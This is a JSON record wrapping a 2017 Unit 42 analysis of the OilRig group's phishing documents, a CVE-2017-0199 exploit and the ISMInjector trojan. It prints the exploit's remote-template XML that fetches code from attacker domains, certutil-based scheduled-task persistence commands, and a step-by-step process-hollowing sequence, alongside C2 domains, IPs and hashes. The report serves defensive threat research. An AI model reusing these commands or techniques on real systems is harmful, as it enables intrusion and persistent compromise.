{
    "id": "f58c1672-31c3-47ed-883a-0a0bed0b7c7d",
    "created_at": "2023-01-12T15:05:35.45054Z",
    "updated_at": "2025-03-27T02:17:27.519682Z",
    "deleted_at": null,
    "sha1_hash": "6dd1706e73e98b83c6cfbef2414de2e5e4e2ad76",
    "title": "2017-10-09 - OilRig Group Steps Up Attacks with New Delivery Documents and New Injector Trojan",
    "authors": "",
    "file_creation_date": "2022-05-28T00:34:24Z",
    "file_modification_date": "2022-05-28T00:34:24Z",
    "file_size": 462992,
    "plain_text": "# OilRig Group Steps Up Attacks with New Delivery Documents and New Injector Trojan\n\n**[unit42.paloaltonetworks.com/unit42-oilrig-group-steps-attacks-new-delivery-documents-new-injector-trojan/](https://unit42.paloaltonetworks.com/unit42-oilrig-group-steps-attacks-new-delivery-documents-new-injector-trojan/)**\n\nRobert Falcone, Bryan Lee October 9, 2017\n\nBy [Robert Falcone and](https://unit42.paloaltonetworks.com/author/robertfalcone/) [Bryan Lee](https://unit42.paloaltonetworks.com/author/bryanlee/)\n\nOctober 9, 2017 at 10:00 AM\n\n[Category: Unit 42](https://unit42.paloaltonetworks.com/category/unit42/)\n\nTags: [ISMAgent,](https://unit42.paloaltonetworks.com/tag/ismagent/) [ISMInjector CVE-2017-0199,](https://unit42.paloaltonetworks.com/tag/isminjector-cve-2017-0199/) [OilRig,](https://unit42.paloaltonetworks.com/tag/oilrig/) [ThreeDollars](https://unit42.paloaltonetworks.com/tag/threedollars/)\n\n[Unit 42’s ongoing research into the OilRig campaign shows that the threat actors involved in](https://blog.paloaltonetworks.com/tag/oilrig/)\nthe original attack campaign continue to add new Trojans to their toolset and continue their\npersistent attacks in the Middle East. When we first discovered the OilRig attack campaign in\nMay 2016, we believed at the time it was a unique attack campaign likely operated by a\nknown, existing threat group. As we have progressed in our research and uncovered\nadditional attack phases, tooling, and infrastructure as discussed in our recent posting\n[“Striking Oil: A Closer Look at Adversary Infrastructure”, it has become apparent that the](https://blog.paloaltonetworks.com/2017/09/unit42-striking-oil-closer-look-adversary-infrastructure/)\nthreat group responsible for the OilRig attack campaign is likely to be a unique, previously\nunknown adversary. Additionally, others have been referring to the group responsible for the\nOilRig campaign itself as the OilRig group as well. To that end, we are elevating the OilRig\nattack campaign to be known as the OilRig group.\n\n\n-----\n\n[In July 2017, we observed the OilRig group using a tool they developed called ISMAgent in a](https://blog.paloaltonetworks.com/2017/07/unit42-oilrig-uses-ismdoor-variant-possibly-linked-greenbug-threat-group/)\nnew set of targeted attacks. The OilRig group developed ISMAgent as a variant of the\nISMDoor Trojan. In August 2017, we found this threat group has developed yet another\nTrojan that they call ‘Agent Injector’ with the specific purpose of installing the ISMAgent\nbackdoor. We are tracking this tool as ISMInjector. It has a sophisticated architecture and\ncontains anti-analysis techniques that we have not seen in previous tools developed by this\nthreat group. The complex structure and inclusion of new anti-analysis techniques may\nsuggest that this group is increasing their development efforts in order to evade detection\nand gain higher efficacy in their attacks.\n\n## The Attack\n\nOn August 23, 2017, we observed OilRig targeting an organization within the United Arab\nEmirates government. The attack involved a spear-phishing email that had a subject of\n“Importan Issue” and two Zip archives attached, as seen in Figure 1. Note that “Important” is\nmisspelled in the sample as shown below.\n\n_Figure 1 Delivery email that contains two Zip archives that contain the malicious delivery_\n_documents_\n\nThe message body in the attack email contains an image that is hosted on a remote server.\nAs shown in Figure 2, hovering over the image shows that the URL link is to an image\nhosted at “www.cdnakamaiplanet[.]com” which we have reason to believe is an adversary\nowned domain. It is likely that the image was embedded to track if the recipient opened the\nemail or not.\n\n\n-----\n\n_Figure 2 URL associated with image included in delivery email_\n\nAnother interesting facet of this attack is that the email addresses in the “To” and “From”\nfields are from addresses from the same domain. Our initial assumption was that the email\naddress in the “From” field was likely spoofed. Additional analysis of the email headers\nrevealed that it did not contain a list of external email servers used to deliver the message as\nexpected from a spoofed email; instead, we discovered the following string within the email\nheaders:\n\nClient=OWA;Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04;\n\nThis string in the header suggests that the OilRig actor is likely to have used the targeted\norganization’s Outlook Web Access (OWA) to send the phishing email using Firefox 36.\n\n[Using information from our research in the Striking Oil blog, we know the OilRig group has](https://blog.paloaltonetworks.com/2017/09/unit42-striking-oil-closer-look-adversary-infrastructure/)\nconducted credential harvesting campaigns specifically by emulating OWA login sites. Based\non that research and this observation, we postulate that the OilRig group gathered\ncredentials to a legitimate user’s OWA account and logged into the user’s account to send\nphishing attacks to other individuals within the same, targeted organization. Also, Firefox 36\nwas released in February 2015; since this email was sent August 2017, we believe it\nsuggests the actors are using an outdated version of Firefox to log into the target\norganization’s OWA.\n\n## The Delivery\n\nThe August 23, 2017 phishing attack contained two Zip archives to the email, “Issue-doc.zip”\nand “Issue-doc1.zip”. Each Zip attachment contains one file, with “Issue.doc” within “Issuedoc.zip” and “Issue.dot” within “Issue-doc1.zip”. The “Issue.doc” and “Issue.dot” files are both\nmalicious documents that will attempt to run in Microsoft Word.\n\nIssue.doc is a Word document that contains a malicious macro that the actors attempt to trick\nthe victim into executing by instructing the user to click the Enable Content button as shown\nin Figure 3. We track this malicious delivery document as ThreeDollars.\n\n\n-----\n\n_Figure 3 Malicious “ThreeDollars” Microsoft Word Document_\n\nOnce enabled, the macro reads in the initial document, searches the data for a delimiter of\n\"###$$$\" to find the base64 encoded payload then writes the encoded payload to the file\n%APPDATA%\\Base.txt. The following shows a hexdump of the delimiter followed by the\nencoded payload:\n\n\n1\n2\n3\n4\n5\n\n\n00088200 23 23 23 24 24 24 54 56 71 51 41 41 4d 41 41 41 |###$$$TVqQAAMAAA|\n00088210 41 45 41 41 41 41 2f 2f 38 41 41 4c 67 41 41 41 |AEAAAA//8AALgAAA|\n00088220 41 41 41 41 41 41 51 41 41 41 41 41 41 41 41\n41 |AAAAAAQAAAAAAAAA|\n00088230 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41\n41 |AAAAAAAAAAAAAAAA|\n..snip..\n\n\nThe macro runs a PowerShell command that will decode the contents of the\n%APPDATA%\\Base.txt file and save it to the file %PUBLIC%\\Libraries\\servicereset.exe,\nwhich it will then execute. The “servicereset.exe” file is a new tool in OilRig’s arsenal that we\ncall ISMInjector, which we will discuss in detail in the next section.\n\nIssue.dot is a file that attempts to exploit CVE-2017-0199 Microsoft Word Office/WordPad\nRemote Code Execution Vulnerability using the following code:\n\n\n-----\n\n1\n2\n3\n4\n5\n\n\n<relationship ID =\"rId5\"\nType=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/ole\nObject\" Target=\"http://www.msofficecdn.com/updatecdnsrv/prelocated/owa/auth/template.rtf\n\" TargetMode=\"External\"/>\n\n\nAs displayed by the code example above, Index.dot file attempts to load a malicious exploit\ndocument hosted at “msoffice-cdn[.]com”, which is the same URL that hosted the exploit\ndocument used in an attack that ClearSky published on August 28, 2017. By correlating\nartifacts found in Index.dot, we discovered another sample attempting to exploit CVE-20170199 used in a separate attack, this time using “office365-management[.]com” as the C2\ndomain.\n\n\n1\n2\n3\n4\n\n\n<Relationship Id=\"rId5\"\nType=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/ole\nObject\" Target=\"http://office365-management.com/updatejuly/template.rtf\"\nTargetMode=\"External\"/>\n\n\nThe resulting payload from this related delivery document is an ISMAgent Trojan that is\nconfigured to use “msoffice365update[.]com” as its C2 server. Please reference our previous\n[blog on ISMAgent for more information on this Trojan.](https://blog.paloaltonetworks.com/2017/07/unit42-oilrig-uses-ismdoor-variant-possibly-linked-greenbug-threat-group/)\n\n## ISMInjector\n\nUltimately, the payload delivered by ThreeDollars is a new tool that we track as ISMInjector.\nAs its name suggests, ISMInjector is a Trojan that is responsible for injecting a Trojan into\nanother process. The payload embedded within the ISMInjector sample delivered in this\n[attack is a variant of the ISMAgent backdoor that we had discussed in detail in our blog](https://blog.paloaltonetworks.com/2017/07/unit42-oilrig-uses-ismdoor-variant-possibly-linked-greenbug-threat-group/)\ndiscussing a targeted attack on a Saudi Arabian technology company.\n\nAt face value, ISMInjector is obfuscated with the off-the-shelf SmartAssembly .NET\nobfuscator created by red-gate.com. The first execution of ISMInjector starts by copying itself\nto %localappdata%\\srvBS.txt and enables persistent access to the system. The code\nachieves persistence by referencing two resources that contain commands the code will\nexecute by running them within a command prompt process, as seen in the following\nscreenshot:\n\nThe two resources that contain commands that ISMInjector uses for persistence are named\n“Tsk1” and “Tsk2”. The specific commands within each of these resources are within Table 1.\nAt a high level, the“Tsk1” command creates a scheduled task named “ReportHealth” that is\n\n\n-----\n\nmeant to run a payload saved to %localappdata%\\srvHealth.exe every 4 minutes. The\n“Tsk2” command creates a scheduled task that runs every 2 minutes that is responsible for\nsaving the payload to srvHealth.exe. This task saves the payload to this location using the\n“certutil” command to decode the original payload saved to “srvBS.txt”.\n\n\n**Resource**\n**Name**\n\n\n**Resource Value**\n\n\nTsk1 SchTasks /Create /SC MINUTE /MO 4 /TN \\\"ReportHealth\\\" /TR\n\\\"%localappdata%\\\\srvHealth.exe\\\" /f\n\nTsk2 SchTasks /Create /SC MINUTE /MO 2 /TN \\\"LocalReportHealth\\\" /TR\n\\\"cmd.exe /c certutil -decode %localappdata%\\\\srvBS.txt\n%localappdata%\\\\srvHealth.exe && schtasks /DELETE /tn LocalReportHealth\n/f && del %localappdata%\\\\srvBS.txt\\\"\"\n\n_Table 1 Resources in ISMInjector containing commands for persistence_\n\nSubsequent executions of the ISMInjector sample from srvHealth.exe will execute its\nfunctional code. ISMInjector’s functional code is split into two different embedded modules\nnamed Inner.dll and Joiner.dll that work in conjunction to inject an embedded ISMAgent\npayload into another process. The two modules, which we will refer to as Joiner and Inner,\nhave the following debug paths, which suggest the author of these modules refer to this\nTrojan as “Agent Injector”:\n\nC:\\Users\\J-Win-10\\Desktop\\Agent Injector\\PolicyConverter\\Inner\\obj\\Release\\Inner.pdb\nC:\\Users\\J-Win-10\\Desktop\\Agent\nInjector\\PolicyConverter\\Joiner\\obj\\Release\\Joiner.pdb\n\nThe main function within the ISMInjector assembly uses the Joiner module to construct the\nfinal payload and the Inner module to inject the final payload into a process. Figure 4 shows\nthe ISMInjector’s main function that uses the two modules to carry out its injection process\nbefore exiting.\n\n_Figure 4 ISMInjector's main function uses methods within the Joiner and Inner modules_\n\nThe Joiner module contains four resources named P11, P12, P21 and P22, which are all\n35840 bytes of binary data. It reads the P11 and P12 resources and saves them to a\nvariable, effectively concatenating them together. The module uses the same logic to\nconcatenate the P21 and P22 resources together, and finally concatenates the P11+P12\nvariable with the P21+P22 variable, which results in the construction of a binary executable.\n\n\n-----\n\nThe ISMInjector code then calls the LoadDll method within the Inner module, providing the\nstring \"Run\", the payload constructed by the Joiner module, and a path to the \"RegAsm.exe\"\nexecutable as arguments, as seen in Figure 4.\n\nThe LoadDLL method constructs an embedded assembly, using the same method as the\nJoiner module used to construct the final payload. However, the Inner module creates\nanother module that is used to actually perform the code injection. To create this embedded\nmodule, the Inner module references two resources named D1 and D2 and concatenates\nthem together. The resulting .NET assembly has a class called \"ClsV2\" that has a method\nnamed \"Run\", which is called in the LoadDll function call shown in Figure 4. The \"Run\"\nmethod within the “ClsV2” class is invoked to execute the payload.\n\nThe \"Run\" method calls functions that has a state machine that dictates the actions taken. At\na high level, these state machines attempt to create a process and inject the constructed\npayload into the newly created process. The use of state machines complicates analysis\nefforts because it makes the flow of execution jump around in a non-sequential fashion.\n\nTable 2 contains the path through the state machines that ISMInjector uses to create a\nremote process, inject its embedded payload then run the payload. Each row of the table\ncontains the current state, a description of the activities performed within that state, as well\nas the next state that will be set and run. The state values jump around dramatically, which\nrequires an analyst to also jump around the code to determine its functionality. This is an\ninteresting anti-analysis technique we have not seen the OilRig actors use in their other\ntools.\n\n**State** **Description** **Next**\n**State**\n\n19 Initializes array 10\n\n10 Initializes array 6\n\n6 Initializes array 3\n\n3 Initializes array 14\n\n14 Initializes array 15\n\n15 Initializes array 16\n\n16 Initializes array 12\n\n12 Initializes array 18\n\n18 Initializes array 8\n\n8 Initializes array 25\n\n\n-----\n\n25 Initializes array 1\n\n1 Initializes array 4\n\n4 Resolves the CreateProcessA function 21\n\n21 Resolves the SetThreadContext function 26\n\n26 Resolves the GetThreadContext function 17\n\n17 Resolves the ReadProcessMemory function 27\n\n27 Resolves the WriteProcessMemory function 24\n\n24 Resolves the NtUnmapViewOfSection function 7\n\n7 Resolves the VirtualAllocEx function 0\n\n0 Resolves the ResumeThread function 23\n\n\n23 Formats a text string as \"{0}\", which is the path to the\n“RegAsm.exe” executable\n\n\n5\n\n\n5 Instantiates a STARTUPINFO structure 22\n\n22 Instantiates a PROCESS_INFORMATION structure 11\n\n11 Sets the size (cb field) of the STARTUPINFO structure 20\n\n20 Enters another state machine to handle the execution of a process 29\n\n**Enter**\n**sub-state**\n**machine**\n\n\n7 Concatenates the path to the “RegAsm.exe” with a space and a\nsecond string, which in this sample is empty\n\n37 Calls the CreateProcessA function using the concatenated string\ncreated in previous state. The CREATE_SUSPENDED flag is used\nin this API function call to create the process in a suspended state.\n\n\n37\n\n44\n\n\n44 Creates a variable to store the process’ ImageBase 19\n\n19 Creates a thread CONTEXT structure 14\n\n\n14 Sets the first index in the context structure to 65538, which sets the\nContextFlags value in the structure to CONTEXT_INTEGER\n\n\n10\n\n\n10 Checks the value of IntPtr.Size to determine x86 or x64 process. 27 or 23\n\n\n-----\n\n27 Calls GetThreadContext to get the context of the suspended thread\nin the newly created and suspended process. It then stores the\nEBX register in the suspended thread into a variable\n\n23 Calls ReadProcessMemory to read EBX+8 in the suspended\nprocess to get the base address of the process. It then creates a\nvariable to store the SizeOfImage from the PE header of the\npayload it intends to inject into the process\n\n22 Creates a variable to store the SizeOfHeaders value from the PE\nheader of the payload it intends to inject into the process\n\n25 Calls VirtualAllocEx to create a new buffer in the suspended\nprocess at the base address of the process\n\n41 It calls WriteProcessMemory to write the PE header of the payload\nto the buffer created at the base address of the suspended\nprocess.\n\n31 Enters a loop in the state machine to effectively write the\nembedded payload section by section to the allocated buffer. Does\nso by setting a counter to 0 that will be compared to\nNumberOfSections in each iteration of the loop\n\n\n23\n\n22\n\n25\n\n41\n\n31\n\n45\n\n\n45 Sets a variable for the VirtualAddress of the PE section 29\n\n29 Sets a variable for the SizeOfRawData of the PE section 28\n\n28 Sets a variable for the PointerToRawData of the PE section 2\n\n\n2 If SizeOfRawData variable is 0 it moves onto the next section by\ngoing to state 30, else it goes to state 20\n\n\n30 or 20\n\n\n30 Increments counter to compare to NumberOfSections 38\n(same\nas 45)\n\n\n20 Creates a byte array with a size of SizeOfRawData for the\nSectionData\n\n21 Copies bytes from the embedded payload to the SectionData\nbuffer\n\n36 Writes the SectionData buffer to the correct VirtualAddress within\nthe remote process memory. If WriteProcessMemory succeeds, it\ncontinues in the loop by going to state 30. Otherwise, after all the\nsections are written to the remote process, state 13 is chosen\n\n13 Sets a variable to store the new base address of the payload\ncopied into the remote process memory.\n\n\n21\n\n36\n\n30 or 13\n\n18\n\n\n-----\n\n18 Sets the EIP value within the CONTEXT structure to store the\nAddressOfEntryPoint of the injected payload\n\n0 Checks to see if the process is x86 or x64 based on the inPtr size\nbeing 4.\n\n16 or 33 Calls SetThreadContext using the CONTEXT structure with the\nnew entrypoint to the injected payload and calls ResumeThead to\nrun the suspended thread. This effectively runs the injected\npayload in the process space of RegAsm.exe.\n\n**Resumes**\n**initial**\n**state**\n**machine**\n\n\n0\n\n16 (x86)\nor 33\n(x64)\n\nEnd of\nsubstate\nmachine\n\n\n29 Ends the function by returning End\n\n_Table 2 State machines used by ISMInjector to inject and execute its payload in another_\n_process_\n\nThe executable injected into the RegAsm.exe process is a variant of the ISMAgent Trojan,\n[which is very similar in behavior to the ISMAgent payload discussed in our previous blog.](https://blog.paloaltonetworks.com/2017/07/unit42-oilrig-uses-ismdoor-variant-possibly-linked-greenbug-threat-group/)\nThis ISMAgent payload is configured to use “cdnmsnupdate[.]com” as its C2 server using\nboth HTTP and DNS tunneling channels.\n\nIt appears the OilRig group may have simply repurposed the injection code from an open\n[source file called DynamicCallRunPE.cs, which is available on GitHub and](https://gist.github.com/BahNahNah/ad367b320f5e62f59b38) [Codegists. The](https://codegists.com/snippet/c/dynamiccallrunpecs_bahnahnah_c)\nactors did not use this code without modification; instead, they used state machines as an\nobfuscation technique to disguise the injection code.\n\nThe path that ISMInjector takes through the state machine and the activities are almost\nidentical to the activities carried out in the DynamicCallRunPE.cs code. It is also possible\nthat this portion of the ISMInjector was obfuscated by a crypter that the threat actors used to\nfurther complicate analysis.\n\n## Infrastructure\n\nBeginning with the initial phishing email, we discovered a significant infrastructure for this\nattack wave that also showed relationships to previous Oilrig attack campaigns both from an\ninfrastructure perspective and shared code.\n\nMuch like previous Oilrig attacks, the C2 domains used typo-squatting techniques in order to\nattempt to evade detection. The image embedded within the phishing email is hosted on\ncdnakamaiplanet[.]com, which resolves to 82.102.14.216. As with other OilRig attacks, this\nIP is not reused to resolve to any other domain However two other IPs on the same /24\n\n\n-----\n\nnetblock are found to be used as C2s. 82.102.14.222 is found to resolve to Microsoftpublisher[.]com, which we observed as a C2 for our initial ISMAgent finding. 82.102.14.246\nresolves to adpolioe[.]com, hich appears to be a typo-squatted domain that also hosts a\nsample of ISMAgent at hxxp://82.102.14[.]246/webdav/aws.exe. This sample’s C2 is\ncdnmsnupdate[.]com which turns out to be the C2 server for three other samples, one\nISMAgent and two of them being ISMAgentInjector. Reverse resolution of this domain\nprovides us the IP 74.91.19.122, which again is not used for any other domain resolution.\nAnother IP on the same /24 is found at 74.91.19.108 resolving to msoffice365update[.]com\nwhich happens to be the C2 domain for the ISMAgent payload delivered by the malicious\ndocument exploiting CVE-2017-1099 mentioned earlier in this blog.\n\nAs previously discussed, the .dot file attempting to exploit CVE-2017-0199 uses msofficecdn[.]com as a C2 to retrieve additional malicious code. Reverse resolution of this domain\nshows an IP of 185.162.235.121, which shares a /24 netblock with 185.162.235.29. This IP\nresolves to office365-management[.]com which is the C2 for a secondary .dot file we were\nable to collect in this attack wave. In figure 5 below you can see the OilRig infrastructure for\nISMInjector that our research uncovered.\n\n_Figure 5 OilRig infrastructure for ISMInjector_\n\n## Conclusion\n\nThe OilRig group continues to target organizations in the Middle East, in this instance\ntargeting the government of the United Arab Emirates. They continue to use the ISMAgent\nTrojan as the final payload in their attacks, this time in conjunction with a custom injector\nTrojan to assist with delivery and execution. The injector Trojan was obfuscated using a\nknown crypter and used state-machines as an anti-analysis technique to complicate its\nprocess to inject the payload into another process. The use of crypters and anti-analysis\ntechniques suggests that the threat actors are increasing their efforts to evade security\nproducts to successfully compromise its targets.\n\n\n-----\n\nAs our research continues to expand into the OilRig group, we are continuously discovering\nnew infrastructure which directly overlaps with previously used infrastructure. With the\naddition of the reuse of tools, similar attack protocols, as well as consistent victimology, we\nhave strong confidence that the original OilRig attack campaign is indeed a single, unique,\nand previously unknown threat group that will hereby be referred to as the OilRig group.\n\nPalo Alto Networks customers are protected from ISMInjector, ISMAgent and ThreeDollars\nby the following:\n\n## Indicators of Compromise\n\n**ThreeDollars SHA256**\n\n119c64a8b35bd626b3ea5f630d533b2e0e7852a4c59694125ff08f9965b5f9cc\n\n**ISMInjector SHA256**\n\n33c187cfd9e3b68c3089c27ac64a519ccc951ccb3c74d75179c520f54f11f647\n\n**ISMAgent SHA256**\n\n74f61b6ff0eb58d76f4cacfb1504cb6b72684d0d0980d42cba364c6ef28223a8\n\n**ISMAgent C2**\n\ncdnmsnupdate[.]com\n\n**Related CVE-2017-0199 SHA256**\n\n66358a295b8b551819e053f2ee072678605a5f2419c1c486e454ab476c40ed6a\n\n**Related CVE-2017-0199 Domains**\n\nmsoffice-cdn[.]com\n\noffice365-management[.]com\n\n## Additional Hashes\n\nf92ab374edd488d85f2e113b40ea8cb8baf993f5c93c12455613ad3265f42b17 (CVE-20170199)\n\nfcad263d0fe2b418db05f47d4036f0b42aaf201c9b91281dfdcb3201b298e4f4 (ISMInjector)\n\n0ccb2117c34e3045a4d2c0d193f1963c8c0e8566617ed0a561546c932d1a5c0c\n(ThreeDollars)\n\n\n-----\n\na9f1375da973b229eb649dc3c07484ae7513032b79665efe78c0e55a6e716821 (ISMAgent)\n\n963f93824d87a56fe91283652eab5841e2ec538c207091dbc9606b962e38805d (ISMAgent)\n\n## Additional Domains\n\nntpupdateserver[.]com\n\ncdnakamaiplanet[.]com\n\nmsoffice365update[.]com\n\nadpolioe[.]com\n\nMicrosoft-publisher[.]com\n\n**Get updates from**\n\n**Palo Alto**\n\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\nStatement.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-10-09 - OilRig Group Steps Up Attacks with New Delivery Documents and New Injector Trojan.pdf"
    ],
    "report_names": [
        "2017-10-09 - OilRig Group Steps Up Attacks with New Delivery Documents and New Injector Trojan.pdf"
    ],
    "threat_actors": [
        {
            "id": "e58deb93-aff1-4be5-8deb-37fe8af0b7ed",
            "created_at": "2022-10-25T16:07:23.918534Z",
            "updated_at": "2025-03-27T02:02:10.02879Z",
            "deleted_at": null,
            "main_name": "Greenbug",
            "aliases": [
                "Greenbug",
                "Volatile Kitten"
            ],
            "source_name": "ETDA:Greenbug",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "cffb3c01-038f-4527-9cfd-57ad5a035c22",
            "created_at": "2022-10-25T15:50:23.38055Z",
            "updated_at": "2025-03-27T02:00:55.459558Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "COBALT GYPSY",
                "IRN2",
                "APT34",
                "Helix Kitten",
                "Evasive Serpens",
                "Hazel Sandstorm",
                "EUROPIUM",
                "ITG13"
            ],
            "source_name": "MITRE:OilRig",
            "tools": [
                "ISMInjector",
                "RDAT",
                "Systeminfo",
                "QUADAGENT",
                "OopsIE",
                "Tasklist",
                "certutil",
                "ZeroCleare",
                "POWRUNER",
                "netstat",
                "ipconfig",
                "LaZagne",
                "BONDUPDATER",
                "SideTwist",
                "PsExec",
                "SEASHARPEE",
                "Mimikatz",
                "RGDoor",
                "ftp"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "67709937-2186-4a32-b64c-a5693d40ac77",
            "created_at": "2023-01-06T13:46:38.495593Z",
            "updated_at": "2025-03-27T02:00:02.848206Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "IRN2",
                "Hazel Sandstorm",
                "EUROPIUM",
                "TA452",
                "Earth Simnavaz",
                "Cobalt Gypsy",
                "Crambus",
                "Helix Kitten",
                "APT 34",
                "APT34",
                "ATK40",
                "G0049",
                "Evasive Serpens",
                "Twisted Kitten"
            ],
            "source_name": "MISPGALAXY:OilRig",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "6bba8e81-73af-4010-86dc-d43c408ca342",
            "created_at": "2023-01-06T13:46:38.553459Z",
            "updated_at": "2025-03-27T02:00:02.860364Z",
            "deleted_at": null,
            "main_name": "Greenbug",
            "aliases": [],
            "source_name": "MISPGALAXY:Greenbug",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "b23e717c-0b27-47e0-b3c8-4defe6dd857f",
            "created_at": "2023-01-06T13:46:38.367369Z",
            "updated_at": "2025-03-27T02:00:02.815758Z",
            "deleted_at": null,
            "main_name": "APT33",
            "aliases": [
                "ATK35",
                "Peach Sandstorm",
                "TA451",
                "APT 33",
                "Elfin",
                "Refined Kitten",
                "MAGNALLIUM",
                "HOLMIUM",
                "COBALT TRINITY",
                "G0064"
            ],
            "source_name": "MISPGALAXY:APT33",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "8f9c8a6e-f6b6-431b-bedd-94fdeea5474a",
            "created_at": "2024-05-01T02:03:08.022974Z",
            "updated_at": "2025-03-27T02:05:17.310877Z",
            "deleted_at": null,
            "main_name": "COBALT GYPSY",
            "aliases": [
                "CHRYSENE ",
                "Crambus ",
                "EUROPIUM ",
                "Hazel Sandstorm ",
                "Helix Kitten ",
                "ITG13 ",
                "OilRig ",
                "Yellow Maero ",
                "APT34 "
            ],
            "source_name": "Secureworks:COBALT GYPSY",
            "tools": [
                " Helminth",
                " Jason",
                " MacDownloader",
                " PoisonFrog",
                " RGDoor",
                " ThreeDollars",
                " TinyZbot",
                " Toxocara",
                " Trichuris",
                " TwoFace",
                "Glimpse"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "25896473-161f-411f-b76a-f11bb26c96bd",
            "created_at": "2023-01-06T13:46:38.75749Z",
            "updated_at": "2025-03-27T02:00:02.910627Z",
            "deleted_at": null,
            "main_name": "CHRYSENE",
            "aliases": [
                "Greenbug"
            ],
            "source_name": "MISPGALAXY:CHRYSENE",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e5ff825b-0456-4013-b90a-971b93def74a",
            "created_at": "2022-10-25T15:50:23.824058Z",
            "updated_at": "2025-03-27T02:00:55.553346Z",
            "deleted_at": null,
            "main_name": "APT33",
            "aliases": [
                "APT33",
                "HOLMIUM",
                "Elfin",
                "Peach Sandstorm"
            ],
            "source_name": "MITRE:APT33",
            "tools": [
                "PowerSploit",
                "AutoIt backdoor",
                "PoshC2",
                "Mimikatz",
                "NanoCore",
                "DEADWOOD",
                "StoneDrill",
                "POWERTON",
                "LaZagne",
                "TURNEDUP",
                "NETWIRE",
                "Pupy",
                "ftp",
                "Shamoon"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "b938e2e3-3d1b-4b35-a031-ddf25b912557",
            "created_at": "2022-10-25T16:07:23.35582Z",
            "updated_at": "2025-03-27T02:02:09.750954Z",
            "deleted_at": null,
            "main_name": "APT 33",
            "aliases": [
                "APT 33",
                "ATK 35",
                "Cobalt Trinity",
                "Curious Serpens",
                "Elfin",
                "Holmium",
                "Magnallium",
                "Peach Sandstorm",
                "Refined Kitten",
                "TA451",
                "Yellow Orc"
            ],
            "source_name": "ETDA:APT 33",
            "tools": [
                "Atros2.CKPN",
                "AutoIt backdoor",
                "Breut",
                "CinaRAT",
                "DROPSHOT",
                "DarkComet",
                "DarkKomet",
                "DistTrack",
                "EmPyre",
                "EmpireProject",
                "FYNLOS",
                "FalseFont",
                "Filerase",
                "Fynloski",
                "JuicyPotato",
                "Krademok",
                "LOLBAS",
                "LOLBins",
                "LaZagne",
                "Living off the Land",
                "Mimikatz",
                "Nancrat",
                "NanoCore",
                "NanoCore RAT",
                "NetWeird",
                "NetWire",
                "NetWire RAT",
                "NetWire RC",
                "NetWired RC",
                "Notestuk",
                "POWERTON",
                "PoshC2",
                "PowerBand",
                "PowerShell Empire",
                "PowerSploit",
                "PsList",
                "Pupy",
                "PupyRAT",
                "Quasar RAT",
                "QuasarRAT",
                "Recam",
                "Remcos",
                "RemcosRAT",
                "Remvio",
                "SHAPESHIFT",
                "Shamoon",
                "Socmer",
                "StoneDrill",
                "TURNEDUP",
                "Tickler",
                "Yggdrasil",
                "Zurten",
                "klovbot",
                "pupy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "b6436f7b-6012-4969-aed1-d440e2e8b238",
            "created_at": "2022-10-25T16:07:23.91517Z",
            "updated_at": "2025-03-27T02:02:10.027531Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "APT 34",
                "ATK 40",
                "Chrysene",
                "Cobalt Gypsy",
                "Crambus",
                "DEV-0861",
                "EUROPIUM",
                "Earth Simnavaz",
                "Evasive Serpens",
                "Hazel Sandstorm",
                "Helix Kitten",
                "IRN2",
                "ITG13",
                "Scarred Manticore",
                "Storm-0861",
                "TA452",
                "Twisted Kitten",
                "UNC1860",
                "Yellow Maero"
            ],
            "source_name": "ETDA:OilRig",
            "tools": [
                "AMATIAS",
                "Agent Drable",
                "Agent Injector",
                "AgentDrable",
                "Alma Communicator",
                "BONDUPDATER",
                "CACTUSPIPE",
                "Clayslide",
                "CypherRat",
                "DNSExfitrator",
                "DNSpionage",
                "DROPSHOT",
                "DistTrack",
                "DropperBackdoor",
                "Fox Panel",
                "GREYSTUFF",
                "GoogleDrive RAT",
                "HighShell",
                "HyperShell",
                "ISMAgent",
                "ISMDoor",
                "ISMInjector",
                "Jason",
                "Karkoff",
                "LIONTAIL",
                "LOLBAS",
                "LOLBins",
                "LONGWATCH",
                "LaZagne",
                "Living off the Land",
                "MailDropper",
                "Mimikatz",
                "MrPerfectInstaller",
                "OILYFACE",
                "OopsIE",
                "POWBAT",
                "POWRUNER",
                "Plink",
                "Poison Frog",
                "PowerExchange",
                "PsList",
                "PuTTY Link",
                "QUADAGENT",
                "RDAT",
                "RGDoor",
                "SEASHARPEE",
                "Saitama",
                "Saitama Backdoor",
                "Shamoon",
                "SideTwist",
                "SpyNote",
                "SpyNote RAT",
                "StoneDrill",
                "TONEDEAF",
                "TONEDEAF 2.0",
                "ThreeDollars",
                "TwoFace",
                "VALUEVAULT",
                "Webmask",
                "WinRAR",
                "ZEROCLEAR",
                "ZeroCleare",
                "certutil",
                "certutil.exe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535935,
